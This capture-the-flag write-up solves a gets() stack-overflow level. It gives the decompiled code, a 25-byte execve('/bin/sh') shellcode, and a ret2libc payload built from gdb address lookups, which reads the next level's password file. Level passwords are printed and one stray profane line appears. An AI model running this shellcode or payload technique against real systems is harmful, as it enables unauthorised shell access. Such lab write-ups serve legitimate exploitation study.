# Level 2
*pass: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77*

```
void main(void)

{
  p();
  return;
}
```

```
void p(void)
{
  uint unaff_retaddr;
  undefined local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}
```

## shellcode
*https://www.coengoedegebure.com/buffer-overflow-attacks-explained/*
```
$ nasm -f elf shellcode.asm
$ objdump -d -M intel shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   50                      push   eax
  10:   89 e2                   mov    edx,esp
  12:   53                      push   ebx
  13:   89 e1                   mov    ecx,esp
  15:   b0 0b                   mov    al,0xb
  17:   cd 80                   int    0x80
```

shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`\
length = 25\
shellcode need to be in the buffer.

Playload length = 84\
Payload: `[ NOP SLED ][ SHELLCODE ][ 16 x 'E' ]`\
NOP-sled value : `\x90`
NOP-sled length = 84 - 25 - 8 = 47


```
$ python -c 'print "\x90" * 39 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x45\x45\x45\x45" * 4' | ./level2
�����������������������������������1�Ph//shh/bin��P��S��
       ̀EEEE
Segmentation fault (core dumped)
```

- Fixing playload
pick an address somewhere in the NOP-sled for the return address to point to.
ouais ouais maris et thomas on raison je fais un truc de merde alors nique
```
(gdb) info proc map
...
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
...
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
```

```
(gdb) info funct system
...
0xb7e6b060  system
...
(gdb) info funct exit
...
0x080483d0  _exit
...
```
p return address : 0x0804853e\
`/bin/sh` address : 0xb7f8cc58\
`system` address : 0xb7e6b060\
`exit` address : 0x080483d0

```
$ python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xd0\x83\x04\x08" + "\x58\xcc\xf8\xb7"' > /tmp/level2
$ cat /tmp/level2 - | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
